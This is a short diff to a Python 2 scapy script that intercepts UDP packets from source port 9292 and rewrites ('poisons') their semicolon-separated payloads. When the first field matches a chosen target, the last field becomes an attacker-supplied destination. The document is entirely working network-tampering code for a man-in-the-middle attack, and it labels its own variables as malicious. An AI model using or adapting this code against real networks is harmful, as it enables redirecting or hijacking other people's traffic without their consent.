@@ -47,16 +47,19 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.UDP) and scapy_packet[scapy.UDP].sport == 9292:
         load = scapy_packet[scapy.Raw].load
         print "[+] Captured a packet whose payload is:\t", load
-        malicious_load = load.split(';')[:-1]
-        if_target = False
+        malicious_load = load.split(';')
+        if len(malicious_load) != 5:
+            malicious_load = [load]
 
         for target in args.targets:
             if re.search(target, malicious_load[0]) is not None:
                 if_target = True
                 break
+        else:
+            if_target = False
 
         if if_target:
-            malicious_load.append(args.dest)
+            malicious_load[-1] = args.dest
             malicious_load = ';'.join(malicious_load)
 
             print "[x] Poison the payload to:\t\t", malicious_load
